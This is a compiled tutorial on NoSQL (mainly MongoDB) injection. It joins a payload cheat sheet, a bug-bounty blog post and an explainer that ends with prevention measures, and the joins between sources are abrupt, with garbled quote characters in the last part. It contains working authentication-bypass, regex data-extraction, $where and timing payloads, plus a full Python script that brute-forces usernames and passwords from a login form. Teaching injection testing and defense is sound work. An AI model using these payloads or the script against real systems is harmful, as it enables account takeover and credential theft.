NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## Exploit

In PHP you can send an Array changing the sent parameter from _parameter=foo_ to _parameter\[arrName]=foo._

The exploits are based in adding an **Operator**:

```bash
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
```

### Basic authentication bypass

**Using not equal ($ne) or greater ($gt)**

```bash
#in URL
username[$ne]=toto&password[$ne]=toto
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
```

### **SQL - Mongo**

```
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00
```

### Extract **length** information

```bash
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
# True if the length equals 1,3...
```

### Extract **data** information

```
in URL (if length == 3)
username[$ne]=toto&password[$regex]=a.{2}
username[$ne]=toto&password[$regex]=b.{2}
...
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### **SQL - Mongo**

```
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
```

### PHP Arbitrary Function Execution

Using the **$func** operator of the [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) library (used by default) it might be possible to execute and arbitrary function as in [this report](https://swarm.ptsecurity.com/rce-cockpit-cms/).

```python
"user":{"$func": "var_dump"}
```

### Get info from different collection

It's possible to use [**$lookup**](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a **different collection** called **`users`** and getting the **results of all the entries** with a password matching a wildcard.

```json
[
  {
    "$lookup":{
      "from": "users",
      "as":"resultado","pipeline": [
        {
          "$match":{
            "password":{
              "$regex":"^.*"
            }
          }
        }
      ]
    }
  }
]
```

### Brute-force login usernames and passwords from POST login

This is a simple script that you could modify but the previous tools can also do this task.

```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)
```

I was recently discussing how to exploit NoSQL vulnerabilities with a bug bounty tester who had successfully used my NoSQLi program to find a vulnerability on a major site (and received a $3k bounty!).

Using the scan tool is a great way to find some injectable strings, but to extract data, it's important to understand the types of injections possible with NoSQL systems, and how they present. For a instructions on setting up a test environment and introduction to NoSQLi, you can also see my post A NoSQL Injection Primer

In this post, I'll walk through the various ways that you might determine if injections are possible, focusing primarily on the most popular NoSQL database, Mongo. From simplest to hardest:

Error based injection (when the server returns a clear NoSQL error)
Blind boolean based injection (When the server evaluates a statement as true or false)
Timing Injections.
Where & How to Inject Payloads
Anywhere you might expect to see SQL injection, you can potentially find nosql injection. consider URL parameters, POST parameters, and even sometimes HTTP headers.

GET requests can often be typed into the browser directly by adding nosql into the URL directly:

1. site.com/page?query=term || '1'=='1
2. site.com/page?user[$ne]=nobody
POST requests generally need to be intercepted and modified, as NoSQL often includes JSON object structures.

1. {"username": "user", "password": "pass"} 
	would change to 
{"username": {"ne": "fakeuser"}, password: "pass"}
2. {"$where":  "return true"}
Each NoSQL system may have it's own syntax, but mongo allows for both JSON (Technically BSON, but that generally happens under the hood server side) and JavaScript. JS can run directly in the Mongo server if passed through functions that allow it, and JS is enabled on the server (it is enabled by default).

If you already understand SQL injection, the concepts here are mostly the same, and only the details differ.

Simple Error Based NoSQL Injection Tests
The simplest way to determine if injection is possible is to input some special noSQL characters, and see if the server returns an error. This might be a full error string indicating the NoSQL database in use, or something like a 500 error.

'"\/$[].>
Plug this string into each GET parameter to see if an error occurs
Replace elements in posted JSON contents with these special characters, or NoSQL keywords like $ne, $eq, $where, $or, etc to see if there are errors.
Send additional objects along with valid JSON. For instance {"user": "nullsweep"} could become {"user": ["nullsweep", "foo"]} or {"$or": [{"user": "foo"}, {"user": "realuser"}]}
Some of these characters may also trigger other injection vulnerabilities (JS injection, SQL injection, shell injection, etc), so further testing may be needed to ensure it is a NoSQL backend.

Blind Boolean Injection
If sending special characters doesn't cause the site to send error information, it may still be possible to find an injection by sending boolean expressions (a true or false result) if the page changes depending on the answer. For instance, a product page with a product ID parameter that is injectable may return product details for one query, but a product not found message otherwise.

A backend query that is looking up a product by doing something like "id = $id" might use a query like db.product.find( {"id": 5} ). Ideally, we would want to control the whole query to inject something always false such as db.product.find( {"$and": [ {"id": 5}, {"id": 6} ]. It isn't always possible to inject operators like $and and $or because the operators preceed the field labels.

Instead, we may have to try a few different things. We could try to make the query match everything but the ID 5: db.product.find( {"id": {"$ne": 5} } ) or use the $in or $nin operators such as db.product.find( {"id": {"$in": []} }) to ensure returning no data.

If the injection is successful, you will see a difference between the 'true' version and 'false' version.

The Boolean Injection Cheatsheet:
{"$ne": -1}
{"$in": []}
{"$and": [ {"id": 5}, {"id": 6} ]}
{"$where":  "return true"}
{"$or": [{},{"foo":"1"}]}
site.com/page?query=term || '1'=='1
site.com/page?user[$ne]=nobody
site.com/page?user=;return true
You may need to try appending certain characters to correctly terminate the query:

//
%00
'
"
some number of closing brackets or braces, in some combination
Timing Based Injection
Sometimes, even when injection is possible and the attacker has sent valid true and false values, the page response is identical, and it can't be determined if an injection was successful or not.

In these cases, we can still try to determine if an injection takes place by asking the NoSQL instance to pause for a period of time before returning results, and detecting the resulting difference in time as the proof of successful injection. Timing injection is identical to blind boolean injection, except instead of trying to get the page to return true or false values, we try to get the page the load more slowly (for true) or quickly (for false).

You will likely need several page loads to gather baseline timing information before beginning the injection. The longer sleep times used in this injection type, the easier it is to spot in the results, but the longer it will take to gather information.

Timing injections are only possible where JS can be executed in the database, and can lead to other interesting attacks.

Timing NoSql Injection Cheatsheet:
{"$where":  "sleep(100)"}
;sleep(100);
NoSQL Injection Limitations
Unlike SQL injection, finding that a site is injectable may not give unfettered access to the data. How the injection presents may allow full control over the backend, or limited querying ability on a single schema. Because records don't follow a common structure, discovering the structure can prove an additional challenge when exploiting these types of vulnerabilities.

To automate finding all of these things, check out NoSQLi

Happy Hunting!

NoSQL (not only SQL) has disrupted the usage of traditional data stores. It has introduced a new concept of data storage which is non-relational unlike the previous storage mechanisms and thus, provides looser restrictions in consistency. It has a document store, key-value store, and graph. Due to the new requirements of modern-day applications, there has been wide adoption of NoSQL databases which could conveniently facilitate the distribution of data across numerous servers. Nosql databases provide an avenue for wide scalability and they require a single database node to execute all operations of the same transaction

NoSQL models offer a new data model and query formats making the old SQL injection attacks irrelevant. Yet, they give attackers new ways to insert malicious code.

Let's understand the NoSQL data models in MongoDB:


Source

Source
The following diagram illustrates a query that selects and orders the matching documents using an index:


Read operations retrieves documents from a collection i.e. queries a collection for documents. This is how you can read the documents from a collection in MongoDB:


db.items.find(queryObject)

db ‚Äî current database object

Items ‚Äî collection names ‚Äòitems‚Äô in the current database

find ‚Äî method to execute on the collection

queryObject ‚Äî an object used to select data

queryObject = {amount:0}; //items with fixed value ‚Äòamount‚Äô is 0
Before we go any further, let‚Äôs quickly analyze the attack mechanism in traditional SQL databases.

SQL Injection
Consider a simple SQL statement used to authenticate a user with a username and password.

SELECT * FROM accounts WHERE username = ‚Äò$username‚Äô AND password = ‚Äò$password‚Äô
If the developer has not incorporated prepared statement to construct the SQL queries, an attacker can supply admin‚Äô ‚Äî in the username field to access the admin user‚Äôs account bypassing the condition that checks for the password. The tampered query may look like this:

SELECT * FROM accounts WHERE username = ‚Äòadmin‚Äô ‚Äî AND password = ‚Äò‚Äô
What is a Second-Order SQL Injection and how can you exploit it successfully?
What is SQL Injection
medium.com

NoSQL Injection
NoSQL database is accessed using a driver which exposes a wrapper that provides libraries in multiple languages for the DB client. These drivers themselves might not be vulnerable, sometimes they present unsafe APIs that, when implemented insecurely by an application developer, could open up avenues for vulnerabilities in the application that allow arbitrary operations on the database. Yet these databases are still potentially vulnerable to injection attacks, even if they aren‚Äôt using the traditional SQL syntax.

MongoDB expects input in JSON array format. The equivalent of the previously illustrated query for NoSQL MongoDB database is

db.accounts.find({username: username, password: password});
While here we are no longer dealing with a query language, an attacker can still achieve the same results as SQL injection by supplying a JSON input object as below:

POST /login HTTP/1.1 
Host: example.org 
Content-Type: application/json 
Content-Length: 38
{
‚Äúusername‚Äù: ‚Äúadmin‚Äù,
‚ÄúPassword‚Äù: {'$gt': ‚Äú‚Äù}
}
If it is not a JSON request

POST /login HTTP/1.1 
Host: example.org 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 29 
user=admin&password[%24ne]=
MongoDB Operators
Here was an example of an equivalent attack in both cases, where the attacker manages to retrieve the admin user‚Äôs record without knowing a password. Both SQL and NoSQL databases are vulnerable to attack.

Exploiting MongoDB query operators:

MongoDB has a lot of query operators

$ne ‚Äî not equal

$gt ‚Äî greater than

$regex ‚Äî regular expression

$where ‚Äî clause lets you specify a script to filter results

$gt & $ne query operator
db.items.find(queryObject)

queryObject ‚Äî an object used to select data, for instance:

queryObject = {amount:0}; //items with fixed value ‚Äòamount‚Äô is 0
If we inject $gt:0, we will obtain all the items with field amount >0. The queryObject will be as follows:

queryObject = {amount: {$gt:0}}; //items with field amount >0
Let‚Äôs consider that the following JSON request is sent to the application:

{desiredType: ‚Äòshirt‚Äô}
{desiredType: {$ge:0}}
Application Controller

app.post(‚Äò/products/find‚Äô,(req,res) => {
const query = {type: req.body.desiredType}
Document.find(query).exec().then((r)=>res.json(r));});
The final query becomes as follows:

{type: {$gt:0}}
In MongoDB, $gt selects those documents where the value of the field is greater than (i.e. >) the specified value. Thus the above statement compares the type in the database with type greater than 0, which returns true.

The same results can be achieved using another comparison operator such as $ne.

$where query operator
The $where clause lets you specify a script to filter results. This operator in MongoDB is a feature that is best avoided. Now, why should we avoid some feature which allows us to specify scripts? Let‚Äôs understand this with a simple example. Let‚Äôs say we have a blog. Our blog has lots of articles that can be read publicly, but we also have some private articles which are for our internal use and not supposed to be published. So we have a field hidden in our documents which can be true or false depending on whether or not our visitors are supposed to see the article. Our MongoDB query to get a list of all articles in a certain category for displaying it to the website visitor looks like this:

db.articles.find({‚Äú$where‚Äù: ‚Äúthis.hidden == false && this.category == ‚Äò‚Äú+category+‚Äù‚Äô‚Äù });
That should make sure nobody looks at our hidden articles. Or does it? When the user controls the category-variable, they can set it to this string to ‚Äò; return ‚Äò‚Äô == ‚Äò

The resulting Javascript snippet which gets sent to the database is this:

this.hidden == false && this.category == ‚Äò‚Äô; return ‚Äò‚Äô == ‚Äò‚Äô
But why can‚Äôt we simply pass a ‚Äò; ‚Äò‚Äô=‚Äô

When you have a javascript snippet with multiple commands separated by a semicolon ‚Äò;‚Äô, they will be executed as a function and a return statement is needed to determine which value will be passed back to the caller. This function will always return true. That means the user will also see all articles in our collection, including those which are supposed to be hidden.

Apparently, MongoDB and many of the NoSQL databases are nothing more than JavaScript processing engines

Its performance is abysmal, and not just because it doesn‚Äôt benefit from indexes. Almost every common use-case can be solved much more efficiently with a common find-query or aggregation, especially one as trivial as this.

How do I prevent it?
Here are some measures to prevent SQL / NoSQL injection attacks, or minimize the impact if it happens:

Prepared Statements: For SQL calls, use prepared statements instead of building dynamic queries using string concatenation.
Input Validation: Validate inputs to detect malicious values. For NoSQL databases, also validate input types against expected types
Least Privilege: To minimize the potential damage of a successful injection attack, do not assign DBA or admin type access rights to your application accounts. Similarly, minimize the privileges of the operating system account that the database process runs under.
